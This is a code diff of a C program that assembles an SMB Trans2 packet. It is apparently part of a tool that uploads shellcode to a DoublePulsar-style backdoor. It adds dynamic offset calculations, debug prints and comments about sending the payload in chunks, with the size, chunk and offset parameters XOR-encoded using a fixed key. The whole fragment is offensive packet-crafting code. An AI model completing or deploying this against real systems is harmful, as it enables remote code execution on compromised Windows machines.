@@ -159,21 +159,35 @@ int main() {
 	trans2->timeout = 0x001a8925;
 	trans2->reserved2 = 0x0000;
 	trans2->parameterCount = 12;
-	trans2->parameterOffset = 66; // make this dynamic -> calc based off sizeof(netbios)+sizeof(trans2) <PARAMS>
+	trans2->parameterOffset = 66; // make this dynamic -> calc based off sizeof(smb_header) + sizeof(Trans_Response) < PARAMS ARE HERE >
 	trans2->dataCount = 4096;
-	trans2->dataOffset = 78; // make this dynamic -> calc based off sizeof(netbios)+sizeof(trans2)+sizeof(params)
+	trans2->dataOffset = 78; // make this dynamic -> calc based off sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters) < SMB DATA IS HERE >
 	trans2->setupCount = 1;
 	trans2->reserved3 = 0x00;
 	trans2->subcommand = 0x000e;
 	trans2->byteCount = 4109; //make this dynamic -> calc based off sizeof(params)+sizeof(SMB_DATA)
 	trans2->padding = 0x00;
 	
+	printf("Offset of Parameters:  %d\n", sizeof(smb_header) + sizeof(Trans_Response));
+        printf("Offset of Data:  %d\n", sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters));
+	int param_offset_len = sizeof(smb_header) + sizeof(Trans_Response);
+	int dataOffset_len = sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters);
+	trans2->parameterOffset = param_offset_len;
+	trans2->dataOffset = dataOffset_len;
+
 	unsigned int XorKey = 0x58581162;
 	
 	smb_parameters *smb_params = (smb_parameters*)(buffer + sizeof(netbios) + sizeof(smb_header) + sizeof(Trans_Response));
-    unsigned long DataSize = 0x507308 ^ XorKey;
-    unsigned long chunksize = 4096 ^ XorKey;
-    unsigned long offset = 0 ^ XorKey;
+	
+	//make DataSize dynamic where it calculates the size of the buffer of the payload / shellcode
+	//In this case, this is static but will change to be dynamic in the future.
+        unsigned long DataSize = 0x507308 ^ XorKey;
+	
+	//size of the chunk of the payload being sent.  all but last packet are 4096
+        unsigned long chunksize = 4096 ^ XorKey;
+	
+	//offset begins at 0 and increments based on the previous packets sent
+        unsigned long offset = 0 ^ XorKey;
     
     memcpy(smb_params->parameters, (unsigned char*)&DataSize, 4);
     memcpy(smb_params->parameters + 4, (unsigned char*)&chunksize, 4);
@@ -193,7 +207,7 @@ int main() {
     memset((buffer + sizeof(netbios) + sizeof(smb_header) + sizeof(Trans_Response) + sizeof(smb_parameters)), 0xFF, rest);
     
     hexDump(NULL, buffer, 4178);
-    
+	
     hexDump(NULL, smb_params->parameters, 12);
     
     return 0;
